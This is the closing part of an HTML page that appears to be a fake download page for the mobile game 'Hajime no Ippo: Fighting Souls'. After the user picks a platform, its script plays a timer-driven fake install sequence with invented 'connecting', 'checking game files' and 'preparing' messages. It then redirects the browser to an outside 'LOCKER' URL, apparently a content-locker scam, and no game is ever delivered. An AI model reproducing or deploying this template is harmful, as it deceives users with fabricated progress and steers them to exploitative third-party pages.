            <p id="error-msg" class="error-msg"></p>
        </div>
    </div>

    <footer class="page-footer">
        © 2026 HAJIME NO IPPO • SECURE MOBILE DEPLOYMENT
    </footer>

    <div id="install-overlay" class="install-overlay">
        <div class="overlay-icon-wrapper">
            <div class="overlay-icon-glow"></div>
            <div class="overlay-icon-card">
                <img id="overlay-logo" src="ippo.webp" alt="Hajime no Ippo: Fighting Souls Logo">
            </div>
        </div>

        <h2 id="install-title" class="install-title">Connecting...</h2>

        <div class="progress-track">
            <div id="progress-bar" class="progress-bar-fill"></div>
        </div>

        <div id="status-logs" class="status-logs">
            &gt; PREPARING YOUR FIGHT
        </div>
    </div>

    <script>
        const LOCKER = "https://downloadaccess.site/cl/i/qn1m65";

        const IPPO_DATA = {
            title: "Hajime no Ippo: Fighting Souls",
            desc: "Step into the ring. Build your boxer and fight for the championship.",
            logo: "ippo.webp",
            slides: [
                "https://i0.wp.com/wp-corp.qoo-app.com/en/wp-content/uploads/sites/3/2020/10/20103003581219.jpg?resize=900%2C795&ssl=1",
                "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmOhQm6pXgJlzKVq9j2IUH0j6_tsDKvjtemZ-bCXsoab1m9RfsrsMA2Wxe&s=10",
                "https://i.ytimg.com/vi/22SywRgOd5c/maxresdefault.jpg"
            ]
        };

        const SLIDE_RATIO = "16 / 9";

        let currentState = { slideIndex: 0, selectedDevice: null };
        const PRELOADED_IMAGES = new Map();

        const DEVICE_IDLE = "device-btn device-idle";
        const DEVICE_ACTIVE = "device-btn device-active";

        function preloadAppImages(slides) {
            slides.forEach(src => {
                if (!PRELOADED_IMAGES.has(src)) {
                    const img = new Image();
                    img.src = src;
                    PRELOADED_IMAGES.set(src, img);
                }
            });
        }

        function initSlider() {
            preloadAppImages(IPPO_DATA.slides);

            const container = document.getElementById('slides-container');
            const dotsContainer = document.getElementById('dots-container');
            const frame = document.getElementById('slider-frame');
            container.innerHTML = "";
            dotsContainer.innerHTML = "";
            currentState.slideIndex = 0;

            frame.style.aspectRatio = SLIDE_RATIO;
            frame.style.overflow = "hidden";
            frame.style.position = frame.style.position || "relative";

            IPPO_DATA.slides.forEach((src, index) => {
                const img = document.createElement('img');
                img.src = src;
                img.alt = `Hajime no Ippo: Fighting Souls Preview ${index + 1}`;
                img.id = `slide-${index}`;

                img.style.position = 'absolute';
                img.style.inset = '0';
                img.style.width = '100%';
                img.style.height = '100%';
                img.style.objectFit = 'cover';
                img.style.objectPosition = 'center';
                img.style.opacity = index === 0 ? '1' : '0';
                img.style.pointerEvents = index === 0 ? 'auto' : 'none';

                container.appendChild(img);

                const dot = document.createElement('div');
                dot.className = `slide-dot${index === 0 ? ' active' : ''}`;
                dot.onclick = () => showSlide(index, IPPO_DATA.slides.length);
                dot.id = `dot-${index}`;
                dotsContainer.appendChild(dot);
            });
        }

        function prevSlide(e) {
            if (e) e.stopPropagation();
            if (IPPO_DATA.slides.length <= 1) return;
            const total = IPPO_DATA.slides.length;
            showSlide((currentState.slideIndex - 1 + total) % total, total);
        }

        function nextSlide(e) {
            if (e) e.stopPropagation();
            if (IPPO_DATA.slides.length <= 1) return;
            const total = IPPO_DATA.slides.length;
            showSlide((currentState.slideIndex + 1) % total, total);
        }

        function showSlide(index, total) {
            for (let i = 0; i < total; i++) {
                const slide = document.getElementById(`slide-${i}`);
                const dot = document.getElementById(`dot-${i}`);
                if (slide) {
                    const isActive = (i === index);
                    slide.style.opacity = isActive ? '1' : '0';
                    slide.style.pointerEvents = isActive ? 'auto' : 'none';
                }
                if (dot) {
                    dot.style.opacity = (i === index) ? '1' : '0.4';
                    dot.style.backgroundColor = (i === index) ? '#f2b84b' : '#ffffff';
                    dot.style.transform = (i === index) ? 'scale(1.25)' : 'scale(1)';
                }
            }
            currentState.slideIndex = index;
        }

        function selectDevice(device) {
            currentState.selectedDevice = device;
            document.querySelectorAll('.device-btn').forEach(btn => {
                btn.className = DEVICE_IDLE;
            });
            const activeBtn = document.getElementById(`device-${device}`);
            if (activeBtn) activeBtn.className = DEVICE_ACTIVE;
            document.getElementById('error-msg').textContent = "";
        }

        function handleDownload() {
            if (!currentState.selectedDevice) {
                const msg = document.getElementById('error-msg');
                msg.textContent = "Please select your platform first";
                setTimeout(() => msg.textContent = "", 2500);
                return;
            }

            const main = document.getElementById('main-content');
            const overlay = document.getElementById('install-overlay');
            const progress = document.getElementById('progress-bar');
            const logs = document.getElementById('status-logs');
            const title = document.getElementById('install-title');

            main.classList.add('fade-out-zoom');

            setTimeout(() => {
                overlay.style.display = "flex";
                document.body.style.overflow = 'hidden';
                setTimeout(() => { overlay.style.opacity = "1"; }, 50);

                const steps = [
                    { p: 25, t: "> CONNECTING TO HAJIME NO IPPO CLUSTER...", title: "SYNCHRONIZING...", d: 1000 },
                    { p: 55, t: "> CHECKING GAME FILES...", title: "PREPARING...", d: 1300 },
                    { p: 85, t: "> GETTING YOUR DOWNLOAD READY...", title: "ALMOST READY...", d: 1200 },
                    { p: 100, t: "> OPENING DOWNLOAD PAGE...", title: "READY", d: 800 }
                ];

                let currentDelay = 0;
                steps.forEach((step, i) => {
                    currentDelay += step.d;
                    setTimeout(() => {
                        progress.style.width = step.p + "%";
                        logs.textContent = step.t;
                        title.textContent = step.title;
                        if (i === steps.length - 1) {
                            setTimeout(() => {
                                window.location.href = LOCKER;
                            }, 1000);
                        }
                    }, currentDelay);
                });
            }, 1000);
        }

        window.addEventListener('pageshow', () => {
            const overlay = document.getElementById('install-overlay');
            const main = document.getElementById('main-content');
            const progress = document.getElementById('progress-bar');

            if (overlay) {
                overlay.style.opacity = "0";
                overlay.style.display = "none";
            }
            if (main) main.classList.remove('fade-out-zoom');
            if (progress) progress.style.width = "0%";
        });

        document.addEventListener('DOMContentLoaded', initSlider);
    </script>
</body>

</html>
